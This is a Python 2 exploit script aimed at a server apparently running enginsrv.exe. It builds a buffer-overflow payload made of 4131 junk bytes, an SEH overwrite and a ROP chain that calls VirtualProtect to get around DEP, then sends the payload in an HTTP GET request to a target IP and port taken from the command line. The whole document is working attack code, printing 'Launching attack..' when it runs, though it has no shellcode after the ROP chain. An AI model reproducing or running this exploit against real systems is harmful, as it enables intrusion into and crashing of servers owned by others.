#!/usr/bin/python

from socket import *
import sys,struct

if len(sys.argv) != 3:
    print "[*] Usage: python %s <ip> <port>" %sys.argv[0]
    sys.exit(0)

host = sys.argv[1]
port = int(sys.argv[2])

totaljunk = 5000
junk = "A" * 4131
seh = struct.pack('<L', 0x0045094a)		# ADD ESP,190 # POP EBX # RETN
rop = struct.pack('<L', 0x004380b3)		# POP EBX # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x77c11120)	# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT msvcrt.dll]
rop += struct.pack('<L', 0x004041bb)	# MOV EDX,DWORD PTR DS:[EBX] # POP EBX # MOV EAX,EDX # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x41414141)	# Filler (compensate)
rop += struct.pack('<L', 0x0048d08c)	# PUSH EDX # DEC EAX # POP ESI # POP EBX # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x41414141)	# Filler (compensate)
rop += struct.pack('<L', 0x004e496b)	# POP EBP # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x0045c94e)	# & jmp esp [enginsrv.exe]
rop += struct.pack('<L', 0x0046468f)	# POP EBX # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x00000201)	# 0x00000201-> ebx
rop += struct.pack('<L', 0x004510bb)	# POP EDX # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x00000040)	# 0x00000040-> edx
rop += struct.pack('<L', 0x0040608b)	# POP ECX # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x004f1172)	# &Writable location [enginsrv.exe]
rop += struct.pack('<L', 0x004099f0)	# POP EDI # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x0048e003)	# RETN (ROP NOP) [enginsrv.exe]
rop += struct.pack('<L', 0x00404b75)	# POP EAX # RETN [enginsrv.exe] 
rop += struct.pack('<L', 0x90909090)	# nop
rop += struct.pack('<L', 0x004560f4)	# PUSHAD # RETN [enginsrv.exe]


sisa = "D" * (totaljunk - len(junk+rop+seh))
payload = junk+seh+rop+sisa

print "[!] Connecting to %s on port %d" % (host,port)
s = socket(AF_INET, SOCK_STREAM)

try:
	s.connect((host,port))
	print "[+] Launching attack.."
	s.send ("GET /" + payload + "HTTP/1.0" + "\x00" + "\r\n\r\n\r\n")
	s.close()
except:
	print "[x] Could not connect to the server x_x"
	sys.exit()
